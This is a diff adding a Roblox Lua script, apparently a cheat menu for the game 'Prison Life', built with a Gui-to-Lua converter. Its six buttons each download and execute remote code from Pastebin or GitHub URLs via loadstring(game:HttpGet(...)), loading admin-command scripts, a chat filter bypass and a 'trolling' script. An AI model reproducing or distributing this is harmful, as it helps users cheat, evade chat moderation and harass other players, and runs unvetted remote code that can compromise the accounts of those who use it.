@@ -1,0 +1,160 @@
+-- Gui to Lua
+-- Version: 3.2
+
+-- Instances:
+
+local PrisonLife = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local LOCALPLAYER = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local TIGERADMIN = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local SEPTEXADMIN = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local INFINITEYIELD = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local CHATBYPASS = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local TROLLINGGUI = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local TextLabel_2 = Instance.new("TextLabel")
+
+--Properties:
+
+PrisonLife.Name = "Prison Life"
+PrisonLife.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+PrisonLife.ResetOnSpawn = false
+PrisonLife.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+Frame.Parent = PrisonLife
+Frame.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.149193555, 0, 0.199751854, 0)
+Frame.Size = UDim2.new(0, 297, 0, 369)
+Frame.Draggable = true
+Frame.Active = true
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.BorderSizePixel = 0
+TextLabel.Size = UDim2.new(0, 297, 0, 71)
+TextLabel.Font = Enum.Font.Bangers
+TextLabel.Text = "PRISON LIFE"
+TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.TextSize = 50.000
+
+LOCALPLAYER.Name = "LOCAL PLAYER"
+LOCALPLAYER.Parent = Frame
+LOCALPLAYER.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+LOCALPLAYER.BorderColor3 = Color3.fromRGB(0, 0, 0)
+LOCALPLAYER.BorderSizePixel = 0
+LOCALPLAYER.Position = UDim2.new(0.0235690232, 0, 0.253571421, 0)
+LOCALPLAYER.Size = UDim2.new(0, 135, 0, 50)
+LOCALPLAYER.Font = Enum.Font.SourceSans
+LOCALPLAYER.Text = "LOCAL PLAYER"
+LOCALPLAYER.TextColor3 = Color3.fromRGB(0, 0, 0)
+LOCALPLAYER.TextSize = 20.000
+LOCALPLAYER.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://pastebin.com/raw/iZ64yzjE'))();
+end)
+
+UICorner.Parent = LOCALPLAYER
+
+TIGERADMIN.Name = "TIGER ADMIN"
+TIGERADMIN.Parent = Frame
+TIGERADMIN.BackgroundColor3 = Color3.fromRGB(255, 85, 0)
+TIGERADMIN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TIGERADMIN.BorderSizePixel = 0
+TIGERADMIN.Position = UDim2.new(0.498316497, 0, 0.253571421, 0)
+TIGERADMIN.Size = UDim2.new(0, 142, 0, 50)
+TIGERADMIN.Font = Enum.Font.SourceSans
+TIGERADMIN.Text = "TIGER ADMIN"
+TIGERADMIN.TextColor3 = Color3.fromRGB(0, 0, 0)
+TIGERADMIN.TextSize = 28.000
+TIGERADMIN.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/h17s3/TIGERADMIN/main/TIGERADMINSCRIPTFREE'),true))()
+end)
+
+UICorner_2.Parent = TIGERADMIN
+
+SEPTEXADMIN.Name = "SEPTEX ADMIN"
+SEPTEXADMIN.Parent = Frame
+SEPTEXADMIN.BackgroundColor3 = Color3.fromRGB(170, 170, 0)
+SEPTEXADMIN.BorderColor3 = Color3.fromRGB(0, 0, 0)
+SEPTEXADMIN.BorderSizePixel = 0
+SEPTEXADMIN.Position = UDim2.new(0.0235690232, 0, 0.460714281, 0)
+SEPTEXADMIN.Size = UDim2.new(0, 135, 0, 50)
+SEPTEXADMIN.Font = Enum.Font.SourceSans
+SEPTEXADMIN.Text = "SEPTEX ADMIN"
+SEPTEXADMIN.TextColor3 = Color3.fromRGB(0, 0, 0)
+SEPTEXADMIN.TextSize = 23.000
+SEPTEXADMIN.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
+end)
+
+UICorner_3.Parent = SEPTEXADMIN
+
+INFINITEYIELD.Name = "INFINITE YIELD"
+INFINITEYIELD.Parent = Frame
+INFINITEYIELD.BackgroundColor3 = Color3.fromRGB(255, 255, 0)
+INFINITEYIELD.BorderColor3 = Color3.fromRGB(0, 0, 0)
+INFINITEYIELD.BorderSizePixel = 0
+INFINITEYIELD.Position = UDim2.new(0.498316497, 0, 0.460714281, 0)
+INFINITEYIELD.Size = UDim2.new(0, 142, 0, 50)
+INFINITEYIELD.Font = Enum.Font.SourceSans
+INFINITEYIELD.Text = "INFINITE YIELD"
+INFINITEYIELD.TextColor3 = Color3.fromRGB(0, 0, 0)
+INFINITEYIELD.TextSize = 20.000
+INFINITEYIELD.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+end)
+
+UICorner_4.Parent = INFINITEYIELD
+
+CHATBYPASS.Name = "CHAT BYPASS"
+CHATBYPASS.Parent = Frame
+CHATBYPASS.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+CHATBYPASS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+CHATBYPASS.BorderSizePixel = 0
+CHATBYPASS.Position = UDim2.new(0.0235690232, 0, 0.650544763, 0)
+CHATBYPASS.Size = UDim2.new(0, 135, 0, 50)
+CHATBYPASS.Font = Enum.Font.SourceSans
+CHATBYPASS.Text = "CHAT BYPASS"
+CHATBYPASS.TextColor3 = Color3.fromRGB(255, 255, 255)
+CHATBYPASS.TextSize = 23.000
+CHATBYPASS.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ChainGotStucked/a55af82d82574/main/Eminence%20Hub%20V1.8"))()
+end)
+
+UICorner_5.Parent = CHATBYPASS
+
+TROLLINGGUI.Name = "TROLLING GUI"
+TROLLINGGUI.Parent = Frame
+TROLLINGGUI.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TROLLINGGUI.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TROLLINGGUI.BorderSizePixel = 0
+TROLLINGGUI.Position = UDim2.new(0.498316497, 0, 0.650544763, 0)
+TROLLINGGUI.Size = UDim2.new(0, 142, 0, 50)
+TROLLINGGUI.Font = Enum.Font.SourceSans
+TROLLINGGUI.Text = "TROLLING"
+TROLLINGGUI.TextColor3 = Color3.fromRGB(0, 0, 0)
+TROLLINGGUI.TextSize = 30.000
+TROLLINGGUI.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet(('https://raw.githubusercontent.com/Denverrz/scripts/master/PRISONWARE_v1.3.txt'),true))()
+end)
+
+UICorner_6.Parent = TROLLINGGUI
+
+TextLabel_2.Parent = Frame
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0, 0, 0.810298085, 0)
+TextLabel_2.Size = UDim2.new(0, 297, 0, 50)
+TextLabel_2.Font = Enum.Font.SourceSans
+TextLabel_2.Text = "MADE BY BMF! Thanks for using (:"
+TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel_2.TextSize = 23.000
